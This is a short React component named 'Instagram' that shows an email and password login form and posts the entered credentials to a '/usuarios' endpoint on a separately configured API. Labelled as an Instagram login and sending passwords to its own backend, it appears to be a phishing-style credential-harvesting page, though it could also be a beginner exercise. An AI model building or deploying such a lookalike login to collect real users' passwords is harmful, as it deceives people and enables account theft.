 import { useRef } from 'react'
import './style.css' 
import api from './api'

function Instagram() {
  const inputEmail = useRef()
  const inputSenha = useRef()

  async function createUsers() {
    if (!inputEmail.current.value || !inputSenha.current.value) {
      alert("Por favor, preencha e-mail e senha.")
      return
    }

    try {
      // O axios usará a baseURL configurada no api.js + '/usuarios'
      await api.post('/usuarios', {
        email: inputEmail.current.value,
        senha: inputSenha.current.value
      })

      inputEmail.current.value = ""
      inputSenha.current.value = ""
      alert("Dados enviados com sucesso!")
    } catch (error) {
      console.error("Erro na requisição:", error)
      alert("Erro ao enviar dados. Verifique o console.")
    }
  }

  return (
    <div className='container'>
      <form onSubmit={(e) => { e.preventDefault(); createUsers(); }}>
        <input placeholder="E-mail" ref={inputEmail} type="email" required />
        <input placeholder="Senha" ref={inputSenha} type="password" required />
        <button type='submit'>Entrar</button>
      </form>
    </div>
  )
}

export default Instagram